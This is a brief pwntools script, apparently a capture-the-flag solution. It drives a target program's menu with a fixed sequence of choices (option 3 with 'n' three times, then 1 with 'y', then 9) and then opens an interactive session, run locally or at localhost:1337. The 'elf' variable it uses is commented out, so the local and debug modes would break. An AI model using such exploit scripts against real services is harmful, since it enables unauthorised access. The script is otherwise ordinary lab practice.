#!/usr/bin/python
from pwn import *

# elf = context.binary = ELF("./main", checksec=False)
# libc = ELF("./libc.so.6", checksec=False)
context.terminal = ['alacritty', '-e']
context.encoding = 'ascii'
context.gdbinit = '~/.config/gdb/.gdbinit'

gs = \
'''
'''

IP = "localhost"
PORT = 1337


def start(logging='notset'):
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(IP, PORT, level=logging)
    else:
        return process(elf.path, level=logging)


def pwn():
    io = start()

    for _ in range(3):
        io.sendlineafter("> ", "3")
        io.sendlineafter("] ", "n")

    io.sendlineafter("> ", "1")
    io.sendlineafter("] ", "y")

    io.sendlineafter("> ", "9")

    io.interactive()
    pause()


if __name__ == "__main__":
    pwn()
